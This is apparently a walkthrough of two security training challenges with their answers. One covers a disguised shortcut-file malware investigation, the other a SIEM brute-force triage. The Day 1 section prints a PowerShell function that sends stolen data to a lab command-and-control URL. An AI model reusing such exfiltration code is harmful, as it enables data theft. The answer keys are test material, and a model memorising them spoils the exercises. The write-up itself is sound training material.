Day 1 - Maybe SOC-mas music, he thought, doesn't come from a store?
Learning Objectives
Learn how to investigate malicious link files.
Learn about OPSEC and OPSEC mistakes.
Understand how to track and attribute digital identities in cyber investigations.

 It’s about a youtube converting website claiming to be safe. After investigating the website, get a youtube link to convert it. Download the zipfile and there’s 2 file after extraction. using the “file” command to check the file’s contents. song.mp3 looks okay but the somg.mp3 looks very suspicious, the output of states that it an “MS Windows shortcut”. So, investigate more with exifTool, and there you can see that this file, somg.mp3, is pulls file from remote server and saves it in the target directory. Next, go to the remote server, ‘https://raw.githubusercontent.com/MM-WarevilleTHM/IS/refs/heads/main/IS.ps1‘, to see it’s content, you should be able to see who created it and the command and control server(c2 server)”:

# Function to send the stolen info to a C2 server
function Send-InfoToC2Server {
    $c2Url = "http://papash3ll.thm/data"
    $data = Get-Content -Path $infoFilePath -Raw

    # Using Invoke-WebRequest to send data to the C2 server
    Invoke-WebRequest -Uri $c2Url -Method Post -Body $data
}

To investigate more, google dork it, remote server shows that it’s githubuser, and we a string from the it, 
Created by the one and only M.M. site:github.com
$c2Url = "http://papash3ll.thm/data" site:github.com

https://github.com/MM-WarevilleTHM/M.M
This will show who M.M. = Mayor Malware

There you have it, with all that information, you successfully completed the learning objectives.


Looks like the song.mp3 file is not what we expected! Run "exiftool song.mp3" in your terminal to find out the author of the song. Who is the author? 
Answer: Tyler Ramsbey

The malicious PowerShell script sends stolen info to a C2 server. What is the URL of this C2 server?
Answer: http://papash3ll.thm/data

Who is M.M? Maybe his Github profile page would provide clues?
Answer: Mayor Malware

What is the number of commits on the GitHub repo where the issue was raised?
Answer: 1

===================================================

Day 2 - One man's false positive is another man's potpourri.
# SOC Alert Analysis: True Positive vs False Positive Investigation Guide

## Prerequisites & Skills Needed
- Basic understanding of SIEM operations and log analysis
- Knowledge of PowerShell commands and Base64 encoding
- Familiarity with authentication logs and network security concepts
- Understanding of IT change management processes
- Basic cybersecurity incident response principles

## Tools & Software Required
- **Elastic SIEM** - Primary investigation platform
- **CyberChef** - For decoding encoded commands (local instance recommended for sensitive data)
- **Browser** - For accessing SIEM interface
- **VM Environment** - Lab setup for hands-on analysis

### Access Credentials
- **URL**: https://LAB_WEB_URL.p.thmlabs.com
- **Username**: elastic
- **Password**: elastic

## Scripts & Code

### PowerShell Command Analyzed
```powershell
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -EncodedCommand SQBuAHMAdABhAGwAbAAtAFcAaQBuAGQAbwB3AHMAVQBwAGQAYQB0AGUAIAAtAEEAYwBjAGUAcAB0AEEAbABsACAALQBBAHUAdABvAFIAZQBiAG8AbwB0AA==
```

### Decoded Command Result
```powershell
Install-WindowsUpdate -AcceptAll -AutoReboot
```

### CyberChef Recipe Configuration
- **Recipe 1**: FromBase64
- **Recipe 2**: Decode text
- **Encoding Setting**: UTF-16LE (1200) - Standard PowerShell Base64 encoding

## Filters & Configurations

### Elastic SIEM Time Window Setup
- **Initial Timeframe**: Dec 1st, 2024, 0900-0930
- **Extended Analysis**: Nov 29 - Dec 1, 2024
- **Configuration**: Use Absolute tab in timeframe settings

### Essential Field Columns
- `host.hostname` - Target machine identification
- `user.name` - Account performing activity
- `event.category` - Event type classification
- `process.command_line` - Actual commands executed
- `event.outcome` - Success/failure status
- `source.ip` - Source IP address

### Key Filters Applied
- **Username Filter**: `service_admin`
- **Source IP Filter**: `10.0.11.11` (legitimate) vs `*.255.1` (brute force)
- **Event Category**: `authentication` vs `process`
- **Filter Operations**: Plus (+) to include, Minus (-) to exclude

## Commands & Procedures

### Step 1: Initial SIEM Access
1. Start Elastic SIEM (5-minute initialization)
2. Navigate to Discover tab via top-left menu
3. Set absolute timeframe (Dec 1st, 2024, 0900-0930)
4. Click Update to apply changes

### Step 2: Field Configuration
1. Hover over field names in left pane
2. Add essential columns: hostname, username, event category, command line, outcome
3. Add source IP field for correlation analysis

### Step 3: Pattern Analysis
1. Identify authentication events preceding PowerShell execution
2. Note time precision between login and command execution
3. Look for generic admin account usage patterns

### Step 4: Historical Context Building
1. Expand timeframe to 3-day window (Nov 29 - Dec 1)
2. Apply user and IP filters to narrow focus
3. Identify authentication spikes and failed login patterns

### Step 5: Brute Force Detection
1. Filter for authentication events only
2. Remove source IP filter to see all authentication sources
3. Identify failed login patterns followed by successful authentication
4. Correlate timing with PowerShell command execution

### Step 6: Command Decoding
1. Extract encoded PowerShell command from process.command_line field
2. Use CyberChef with Base64 decoding
3. Apply UTF-16LE encoding for PowerShell compatibility
4. Analyze decoded command purpose and legitimacy

## Key Data & Metrics

### Event Statistics
- **Initial Alert Window**: 21 events (Dec 1st, 0900-0930)
- **Extended Analysis**: 6,800+ events (3-day period)
- **Authentication Pattern**: Precise timing between login and PowerShell execution

### IP Address Analysis
- **Legitimate Source**: 10.0.11.11 (consistent historical activity)
- **Brute Force Source**: *.255.1 (spike pattern, failed logins)
- **Pattern**: Failed logins stopped after successful authentication

### Account Details
- **Target Account**: service_admin (generic admin account)
- **Usage Pattern**: Two administrators normally use this account
- **Timeline**: Administrators confirmed not in office during incident

## Critical Takeaways

### True Positive vs False Positive Decision Framework

#### SOC Superpower Method
- **Primary Approach**: Direct user confirmation via email/phone
- **Change Management**: Verify approved Change Requests
- **Limitations**: Insider threats, social engineering, unauthorized activities

#### Context Analysis Factors
- **User Behavior Patterns**: Historical activity comparison
- **Departmental Norms**: Tool usage relative to job function
- **Correlation Requirements**: Build timeline using IP addresses, hostnames, usernames, file paths

#### This Case Classification: True Positive
**Evidence Supporting TP Classification:**
- Brute force attack pattern detected
- Successful unauthorized access achieved
- Generic admin account compromised during off-hours
- No approved change request for activity
- Timing precision indicates automated/scripted activity

#### Plot Twist Resolution
- **Actual Activity**: Legitimate Windows Update installation
- **Perpetrator**: Glitch (helping fix outdated credentials)
- **Method**: Brute force to access systems with expired script credentials
- **Outcome**: Security improvement rather than attack
- **Lesson**: Thorough investigation prevents misclassification

### Investigation Best Practices
- Always correlate multiple event types (authentication + process execution)
- Expand time windows to understand historical context
- Decode suspicious commands before making final determination
- Consider both technical evidence and business context
- Verify user authorization and change management processes
- Look for patterns that distinguish legitimate automation from attacks

What is the name of the account causing all the failed login attempts?
Answer: service_admin
How many failed logon attempts were observed?
Answer: 6791
What is the IP address of Glitch?
Answer: 10.0.255.1
When did Glitch successfully logon to ADM-01? Format: MMM D, YYYY HH:MM:SS.SSS
Answer: Dec 1, 2024 08:54:39.000
What is the decoded command executed by Glitch to fix the systems of Wareville?
Answer: Install-WindowsUpdate -AcceptAll -AutoReboot

===================================================

Day 3 - Even if I wanted to go, their vulnerabilities wouldn't allow it.
























